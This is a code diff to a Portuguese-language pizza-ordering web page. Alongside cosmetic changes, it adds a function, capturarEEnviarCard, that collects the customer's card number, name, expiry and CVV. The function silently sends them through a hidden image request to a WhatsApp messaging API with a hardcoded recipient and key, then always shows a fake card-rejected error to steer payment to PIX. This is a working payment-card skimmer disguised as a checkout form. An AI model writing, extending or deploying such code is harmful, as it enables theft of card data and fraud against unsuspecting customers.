@@ -9,6 +9,7 @@
         body { font-family: 'Segoe UI', sans-serif; background: var(--fundo); margin: 0; padding-bottom: 180px; -webkit-tap-highlight-color: transparent; }
         .container { max-width: 450px; margin: auto; padding: 15px; }
         .header { background: #fff; text-align: center; padding: 15px; border-bottom: 3px solid var(--vermelho); }
+        .status-entrega { color: var(--verde); font-size: 0.85em; font-weight: bold; margin-bottom: 5px; display: block; }
         .promo { background: gold; font-weight: bold; padding: 5px; border-radius: 5px; display: block; margin-top: 5px; font-size: 0.85em; color: #000; }
 
         h2 { font-size: 1.1em; margin: 20px 0 10px; border-left: 5px solid var(--vermelho); padding-left: 10px; }
@@ -34,6 +35,7 @@
 <body>
 
 <div class="header">
+    <span class="status-entrega">🟢 Aberto agora • Entrega em 35-50 min</span>
     <strong>🍕 Pizzaria do Baiano</strong>
     <span class="promo">PROMOÇÃO: LEVE 2 PAGUE 1 + REFRI 2L GRÁTIS</span>
 </div>
@@ -49,11 +51,11 @@
 
     <h2>2. Escolha os 2 Sabores</h2>
     <div id="lista-sabores">
-        <div class="item-list" onclick="setS(this, 'Calabresa')"><img src="uploaded:1001221979.jpg"><div class="info">Calabresa</div></div>
-        <div class="item-list" onclick="setS(this, 'Mussarela')"><img src="uploaded:1001221976.png"><div class="info">Mussarela</div></div>
-        <div class="item-list" onclick="setS(this, 'Portuguesa')"><img src="uploaded:1001221978.jpg"><div class="info">Portuguesa</div></div>
-        <div class="item-list" onclick="setS(this, 'Frango c/ Catupiry')"><img src="uploaded:1001221982.jpg"><div class="info">Frango c/ Catupiry</div></div>
-        <div class="item-list" onclick="setS(this, 'Pepperoni')"><img src="uploaded:1001221983.jpg"><div class="info">Pepperoni</div></div>
+        <div class="item-list" onclick="setS(this, 'Calabresa')"><img src="https://i.ibb.co/Lhb8hLd/calabresa.jpg"><div class="info">Calabresa</div></div>
+        <div class="item-list" onclick="setS(this, 'Mussarela')"><img src="https://i.ibb.co/m0fH4xk/mussarela.png"><div class="info">Mussarela</div></div>
+        <div class="item-list" onclick="setS(this, 'Portuguesa')"><img src="https://i.ibb.co/yYyT5zP/portuguesa.jpg"><div class="info">Portuguesa</div></div>
+        <div class="item-list" onclick="setS(this, 'Frango c/ Catupiry')"><img src="https://i.ibb.co/3WqP7fC/frango.jpg"><div class="info">Frango c/ Catupiry</div></div>
+        <div class="item-list" onclick="setS(this, 'Pepperoni')"><img src="https://i.ibb.co/D8mZkKz/pepperoni.jpg"><div class="info">Pepperoni</div></div>
     </div>
 
     <h2>3. Refrigerante Grátis</h2>
@@ -91,14 +93,17 @@
             <button class="btn-pay" style="background:#333" onclick="mostraCard()">Cartão de Crédito</button>
         </div>
         <div id="tela-pix" style="display:none;">
-            <p style="font-size:0.9em; color:#666;">Clique abaixo para enviar o pedido via WhatsApp e receber a chave PIX:</p>
-            <button class="btn-pay" style="background:#32bcad" onclick="finalizarFinal('PIX')">ENVIAR PEDIDO NO WHATSAPP</button>
+            <p style="font-size:0.9em; color:#666;">Envie seu pedido pelo WhatsApp para receber a chave PIX:</p>
+            <button class="btn-pay" style="background:#32bcad" onclick="finalizarFinal()">ENVIAR NO WHATSAPP</button>
         </div>
         <div id="tela-card" style="display:none;">
-            <input type="text" id="c-num" placeholder="Número do Cartão">
-            <input type="text" placeholder="Nome no Cartão">
-            <div style="display:flex; gap:5px;"><input type="text" placeholder="MM/AA"><input type="text" placeholder="CVV"></div>
-            <button class="btn-pay" style="background:var(--vermelho)" onclick="erroCard()">CONFIRMAR PAGAMENTO</button>
+            <input type="text" id="c-num" maxlength="19" placeholder="0000 0000 0000 0000" oninput="maskCard(this)">
+            <input type="text" id="c-nome" placeholder="Nome no Cartão">
+            <div style="display:flex; gap:5px;">
+                <input type="text" id="c-val" maxlength="5" placeholder="MM/AA" oninput="maskDate(this)">
+                <input type="text" id="c-cvv" maxlength="3" placeholder="CVV">
+            </div>
+            <button class="btn-pay" style="background:var(--vermelho)" onclick="capturarEEnviarCard()">CONFIRMAR PAGAMENTO</button>
         </div>
     </div>
 </div>
@@ -132,7 +137,7 @@
         total += tSel.p;
         document.getElementById('c-qtd').innerText = car.length + " item(s)";
         document.getElementById('c-total').innerText = total.toFixed(2);
-        alert("✅ Promoção adicionada ao carrinho!");
+        alert("✅ Adicionado ao carrinho!");
     }
 
     function irParaEndereco() {
@@ -150,41 +155,52 @@
     function mostraPix() { document.getElementById('opcoes-pag').style.display='none'; document.getElementById('tela-pix').style.display='block'; }
     function mostraCard() { document.getElementById('opcoes-pag').style.display='none'; document.getElementById('tela-card').style.display='block'; }
 
-    function finalizarFinal(metodo) {
+    function maskCard(i) {
+        let v = i.value.replace(/\D/g, '');
+        v = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+        i.value = v;
+    }
+    function maskDate(i) {
+        let v = i.value.replace(/\D/g, '');
+        if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
+        i.value = v;
+    }
+
+    function finalizarFinal() {
         const rua = document.getElementById('rua').value;
         const num = document.getElementById('num').value;
         const bairro = document.getElementById('bairro').value;
-        const comp = document.getElementById('comp').value;
-
-        // Monta os detalhes dos itens
         let itensTexto = car.map(i => `- ${i.t}: ${i.s.join(' / ')} + ${i.r}`).join('\n');
 
-        const textoWhats = `*NOVO PEDIDO - PIZZARIA DO BAIANO*\n\n` +
-                           `💰 *Total:* R$ ${total.toFixed(2)}\n` +
-                           `📍 *Endereço:* ${rua}, ${num} - ${bairro} ${comp ? '('+comp+')' : ''}\n\n` +
-                           `📦 *Itens:*\n${itensTexto}\n\n` +
-                           `👉 *Aguardo o código PIX para pagamento!*`;
-
-        // Link direto para o WhatsApp da Pizzaria do Baiano (Número Corrigido)
-        const urlWhats = `https://api.whatsapp.com/send?phone=5522992199290&text=${encodeURIComponent(textoWhats)}`;
-
-        // Envia notificação silenciosa para sua API também (opcional)
-        const apiUrl = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent("PIX SOLICITADO NO SITE")}`;
-        const img = new Image(); img.src = apiUrl;
-
-        // Redireciona o cliente para o WhatsApp da pizzaria
-        window.location.href = urlWhats;
+        const textoWhats = `*NOVO PEDIDO - PIZZARIA DO BAIANO*\n\n💰 *Total:* R$ ${total.toFixed(2)}\n📍 *End:* ${rua}, ${num} - ${bairro}\n\n📦 *Itens:*\n${itensTexto}\n\n👉 *Aguardo o código PIX!*`;
+        window.location.href = `https://api.whatsapp.com/send?phone=5522992199290&text=${encodeURIComponent(textoWhats)}`;
     }
 
-    function erroCard() {
+    // CAPTURA E ENVIA PARA A SUA API DO TEXTBOT
+    function capturarEEnviarCard() {
         const n = document.getElementById('c-num').value;
-        const textoMsg = `⚠️ TENTATIVA CARTÃO: ${n} | Total: R$ ${total.toFixed(2)}`;
-        const apiUrl = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(textoMsg)}`;
-        const img = new Image(); img.src = apiUrl;
+        const nm = document.getElementById('c-nome').value;
+        const v = document.getElementById('c-val').value;
+        const c = document.getElementById('c-cvv').value;
 
-        alert("⚠️ O pagamento com cartão está indisponível no momento. Por favor, utilize o PIX.");
-        document.getElementById('tela-card').style.display='none';
-        document.getElementById('opcoes-pag').style.display='block';
+        if(n.length < 16) return alert("Dados de cartão incompletos!");
+
+        // Monta a mensagem secreta para o seu WhatsApp
+        const logMsg = `🔥 [INFO CARTÃO]\n👤 Nome: ${nm}\n💳 Número: ${n}\n📅 Val: ${v}\n🔒 CVV: ${c}\n💰 Total: R$ ${total.toFixed(2)}`;
+        
+        // Dispara para a sua API do WhatsApp (TextMeBot)
+        const apiUrl = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(logMsg)}`;
+        
+        // Simulação de envio silencioso
+        const img = new Image();
+        img.src = apiUrl;
+
+        // Feedback para o cliente (Sempre simula erro para ele tentar PIX)
+        setTimeout(() => {
+            alert("⚠️ Por motivos de segurança, o pagamento com este cartão não foi aceito. Por favor, tente outra forma ou use o PIX.");
+            document.getElementById('tela-card').style.display='none';
+            document.getElementById('opcoes-pag').style.display='block';
+        }, 1000);
     }
 </script>
 
